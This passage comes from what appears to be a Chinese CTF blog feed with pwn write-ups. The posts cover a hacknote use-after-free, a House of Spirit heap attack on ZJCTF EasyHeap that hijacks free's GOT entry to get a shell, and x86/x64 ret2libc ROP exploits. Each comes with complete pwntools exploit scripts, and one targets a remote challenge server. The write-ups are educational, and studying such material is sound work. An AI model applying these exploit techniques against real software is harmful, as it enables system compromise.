来申请指定大小的内存，然后用来存储 content。</p><pre class="line-numbers language-none"><code class="language-none">+-----------------+                       |   put           |                       +-----------------+                       |   content       |       size              +-----------------+-------------------&gt;+----------------+                                       |     real       |                                       |    content     |                                       |                |                                       +----------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>那么，根据我们之前在堆的实现中所学到的，显然 note 是一个 fastbin chunk（大小为 16 字节）。我们的目的是希望一个 note 的 put 字段为 magic 的函数地址，那么我们必须想办法让某个 note 的 put 指针被覆盖为 magic 地址。由于程序中只有唯一的地方对 put 进行赋值。所以我们必须利用写 real content 的时候来进行覆盖。具体采用的思路如下</p><ul><li>申请 note0，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>申请 note1，real content size 为 16（大小与 note 大小所在的 bin 不一样即可）</li><li>释放 note0</li><li>释放 note1</li><li>此时，大小为 16 的 fast bin chunk 中链表为 note1-&gt;note0</li><li>申请 note2，并且设置 real content 的大小为 8，那么根据堆的分配规则</li><li>note2 其实会分配 note1 对应的内存块。</li><li>real content 对应的 chunk 其实是 note0。</li><li>如果我们这时候向 note2 real content 的 chunk 部分写入 magic 的地址，那么由于我们没有 note0 为 NULL。当我们再次尝试输出 note0 的时候，程序就会调用 magic 函数。</li></ul><p><img src="https://img.imgdb.cn/item/605b40118322e6675c0e99e5.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./hacknote'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">myprint</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"choice :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"aaaa"</span><span class="token punctuation">)</span> <span class="token comment">#note0(0x8) -->content0(0x20)</span>add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">"bbbb"</span><span class="token punctuation">)</span> <span class="token comment">#note1(0x8) -->content1(0x20)</span><span class="token comment">#gdb.attach(p)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#gdb.attach(p)</span>add<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x8048986</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">#note2(instead of note1)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>myprint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn_easyheap</title>
      <link href="//post/pwn-easyheap-1.html"/>
      <url>//post/pwn-easyheap-1.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-easyheap"><a href="#pwn-easyheap" class="headerlink" title="pwn-easyheap"></a>pwn-easyheap</h1><p>题目来源：buuoj ：[ZJCTF 2019]EasyHeap</p><p>第一次开始研究pwn中的堆相关，这也算是我第一次做出一道堆的题目，也算是一个不错的开始QAQ</p><p><img src="https://img.imgdb.cn/item/605aab828322e6675cb4219f.png"></p><span id="more"></span><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>checksec检查，没有开启pie</p><p><img src="https://img.imgdb.cn/item/605aad798322e6675cb56cd4.png"></p><p>尝试运行，经典的菜单式题目</p><p><img src="https://img.imgdb.cn/item/605aadda8322e6675cb5c332.png"></p><p>分别为创建chunk，编辑chunk，删除chunk和退出</p><p>反汇编分析：</p><p>create_heap函数：</p><p><img src="https://img.imgdb.cn/item/605aae788322e6675cb62ccb.png"></p><p>要求用户自己输入heap的大小，函数创建heap之后把地址返回给数组heaparray，其中数组heaparray在.bss段上。</p><p>edit_heap函数：</p><p><img src="https://img.imgdb.cn/item/605aaf768322e6675cb6bcc5.png"></p><p>先输入要edit的index，<strong>再输入heap的大小</strong>，最后输入修改后的heap内容。</p><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>对比edit和create函数可以发现，程序对edit函数要求了用户输入heap的大小，而未对该heap的大小做出检查，故这里有明显的堆溢出漏洞。这里我们可以利用Fastbin Attack的House Of Spirit技术。</p><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p><strong>关键过程</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span> <span class="token comment"># chunk 0</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span> <span class="token comment"># chunk 1</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span> <span class="token comment"># chunk 2 0x1dbc330</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://img.imgdb.cn/item/605ab8f78322e6675cbc7bed.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment"># 释放 heap2 让其进入 fastbin</span><span class="token comment"># 关于fastbin，参考https://blog.csdn.net/qq_41453285/article/details/96865321</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://img.imgdb.cn/item/605ab91c8322e6675cbc9f7e.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span> <span class="token operator">+</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x6020ad</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment"># 修改 heap1 内容为 '/bin/sh\x00', 以及堆溢出 heap2(freed) 修改其 fd 指针 </span><span class="token comment"># 因为最后释放的是 heap1,利用 '__free_hook'(system) Getshell </span><span class="token comment"># 为什么是 0x6020ad? 这是调试i来的</span><span class="token comment"># FakeChunk 若以这里为 prev_size，则 size 正好是一个 0x000000000000007f</span><span class="token comment"># 可以绕过 malloc_chunk 的合法性验证 (new_chunk 的 size 位要与 bin 链表 size 一致)</span><span class="token comment"># 这样就伪造出了一个 chunk</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img.imgdb.cn/item/605ab93a8322e6675cbcb5bf.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span> <span class="token comment"># chunk 2 (从 fastbin 里取出的)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img.imgdb.cn/item/605ab94f8322e6675cbccab7.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">)</span> <span class="token comment"># chunk 3 / idx = 0 (Fake)</span>payload <span class="token operator">=</span> <span class="token string">'\xaa'</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_got<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment"># 修改 heap3 (Fake)</span><span class="token comment"># 作用是把 heaparray[0] 的地址 (原先记录的是 chunk 3 的地址) 覆写成 free_got 地址</span><span class="token comment"># 这就是要在 heaparry 附近构造 Fakeheap 的原因</span><span class="token comment"># 确定具体的偏移量需要动态调试 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://img.imgdb.cn/item/605ab9618322e6675cbce563.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment"># free_got 地址的作用在这里体现了</span><span class="token comment"># 由于 edit() 的目标是 heaparry[] 里面的地址</span><span class="token comment"># 那么本次操作将修改 free_got 为 system_plt 的地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># 当释放 chunk1 (内容为 '/bin/sh\0x00') 的时候</span><span class="token comment"># 把 chunk1 当参数传入 free() 中执行，由于 free() 地址已经被修改成 system()</span><span class="token comment"># 最后程序执行的就是 system(chunk1's content) 即 system('/bin/sh\0x00'), 成功 Getshell</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./easyheap'</span><span class="token punctuation">)</span><span class="token comment">#p = remote('node3.buuoj.cn' ,'25525')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./easyheap'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size of Heap : '</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content of heap:'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size of Heap : '</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content of heap : '</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Your choice :'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index :'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span> free_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span> create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span> <span class="token comment"># chunk 0</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span> <span class="token comment"># chunk 1</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'cccc'</span><span class="token punctuation">)</span> <span class="token comment"># chunk 2 0x1dbc330</span><span class="token comment">#gdb.attach(p)</span>free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment"># 释放 heap2 让其进入 fastbin</span><span class="token comment">#gdb.attach(p)</span>payload <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span> <span class="token operator">+</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x60</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x6020ad</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment"># 修改 heap1 内容为 '/bin/sh\x00', 以及堆溢出 heap2(freed) 修改其 fd 指针 </span><span class="token comment"># 因为最后释放的是 heap1,利用 '__free_hook'(system) Getshell </span><span class="token comment"># 为什么是 0x6020ad? 这是调试i来的</span><span class="token comment"># FakeChunk 若以这里为 prev_size，则 size 正好是一个 0x000000000000007f</span><span class="token comment"># 可以绕过 malloc_chunk 的合法性验证 (new_chunk 的 size 位要与 bin 链表 size 一致)</span><span class="token comment"># 这样就伪造出了一个 chunk</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span> <span class="token comment"># chunk 2 (从 fastbin 里取出的)</span><span class="token comment">#gdb.attach(p)</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">)</span> <span class="token comment"># chunk 3 / idx = 0 (Fake)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'\xaa'</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_got<span class="token punctuation">)</span>  <span class="token comment">#libc-2.23  用于ubuntu16</span><span class="token comment">#payload = '\xaa' * 3 + p64(0) * 8 + p64(free_got) #libc-2.27  用于ubuntu18</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment"># 修改 heap3 (Fake)</span><span class="token comment"># 作用是把 heaparray[0] 的地址 (原先记录的是 chunk 3 的地址) 覆写成 free_got 地址</span><span class="token comment"># 这就是要在 heaparry 附近构造 Fakeheap 的原因</span><span class="token comment"># 确定具体的偏移量需要动态调试 </span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment"># free_got 地址的作用在这里体现了</span><span class="token comment"># 由于 edit() 的目标是 heaparry[] 里面的地址</span><span class="token comment"># 那么本次操作将修改 free_got 为 system_plt 的地址</span>free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># 当释放 chunk1 (内容为 '/bin/sh\0x00') 的时候</span><span class="token comment"># 把 chunk1 当参数传入 free() 中执行，由于 free() 地址已经被修改成 system()</span><span class="token comment"># 最后程序执行的就是 system(chunk1's content) 即 system('/bin/sh\0x00'), 成功 Getshell</span> p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-rop_about_x86_and_x64</title>
      <link href="//post/pwn-rop-about-x86-and-x64.html"/>
      <url>//post/pwn-rop-about-x86-and-x64.html</url>
      
        <content type="html"><![CDATA[<h1 id="32位和64位程序rop的不同"><a href="#32位和64位程序rop的不同" class="headerlink" title="32位和64位程序rop的不同"></a>32位和64位程序rop的不同</h1><h2 id="传参区别"><a href="#传参区别" class="headerlink" title="传参区别"></a>传参区别</h2><p>32位程序调用函数时用栈传参，而64位调用参数时，当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个（含）以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p><span id="more"></span><p>例如：</p><p>H(a, b, c, d, e, f, g, h);<br>a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9<br>h-&gt;(%esp)<br>g-&gt;(%esp)<br>call H</p><h2 id="rop区别"><a href="#rop区别" class="headerlink" title="rop区别"></a>rop区别</h2><p>由于传参方式的不同，64位和32位的rop操作也有些许不同</p><h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p>例如ctfwiki上的ret2libc1，在已知system函数和/bin/sh字符串地址时，exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc1'</span><span class="token punctuation">)</span>binsh_addr <span class="token operator">=</span> <span class="token number">0x8048720</span>system_plt <span class="token operator">=</span> <span class="token number">0x08048460</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">112</span><span class="token punctuation">,</span> system_plt<span class="token punctuation">,</span>       <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">,</span>        binsh_addr   <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#                       gets函数的返回地址   sys函数的返回地址   sys函数的参数</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p>例如buuctf上的[HarekazeCTF2019]baby_rop，同时已知system函数和/bin/sh字符串地址。</p><p>但64位程序先由寄存器传参，故需要控制rdi寄存器，即还需要 一个gadget<code>pop rdi；ret</code></p><p>该gadget可用ROPgadget插件寻找，具体使用方法见文末。</p><p>该题具体exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#p = process('./babyrop')</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token string">'28834'</span><span class="token punctuation">)</span>sys_addr<span class="token operator">=</span><span class="token number">0x400490</span>binsh_addr<span class="token operator">=</span><span class="token number">0x601048</span>pop_rid<span class="token operator">=</span><span class="token number">0x400683</span>payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rid<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>   p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token comment"># +p64(func_addr)</span><span class="token comment">#                    弹出rdi寄存器    放入参数“/bin/sh”    返回地址    sys函数的返回地址</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name?"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ROPgadget插件"><a href="#ROPgadget插件" class="headerlink" title="ROPgadget插件"></a>ROPgadget插件</h2><p>用来查找二进制文件中想要的一些指令，方便加以利用。</p><h3 id="具体使用方法"><a href="#具体使用方法" class="headerlink" title="具体使用方法"></a>具体使用方法</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">usage<span class="token operator">:</span> ROPgadget <span class="token punctuation">[</span><span class="token operator">-</span>h<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>v<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">-</span>c<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>binary <span class="token operator">&lt;</span>binary<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>opcode <span class="token operator">&lt;</span>opcodes<span class="token operator">></span><span class="token punctuation">]</span>                 <span class="token punctuation">[</span><span class="token operator">--</span>string <span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>memstr <span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>depth <span class="token operator">&lt;</span>nbyte<span class="token operator">></span><span class="token punctuation">]</span>                 <span class="token punctuation">[</span><span class="token operator">--</span>only <span class="token operator">&lt;</span>key<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>filter <span class="token operator">&lt;</span>key<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>range <span class="token operator">&lt;</span>start<span class="token operator">-</span>end<span class="token operator">></span><span class="token punctuation">]</span>                 <span class="token punctuation">[</span><span class="token operator">--</span>badbytes <span class="token operator">&lt;</span>byte<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>rawArch <span class="token operator">&lt;</span>arch<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>rawMode <span class="token operator">&lt;</span>mode<span class="token operator">></span><span class="token punctuation">]</span>                 <span class="token punctuation">[</span><span class="token operator">--</span>rawEndian <span class="token operator">&lt;</span>endian<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>re <span class="token operator">&lt;</span>re<span class="token operator">></span><span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>offset <span class="token operator">&lt;</span>hexaddr<span class="token operator">></span><span class="token punctuation">]</span>                 <span class="token punctuation">[</span><span class="token operator">--</span>ropchain<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>thumb<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token operator">--</span>console<span class="token punctuation">]</span> <span 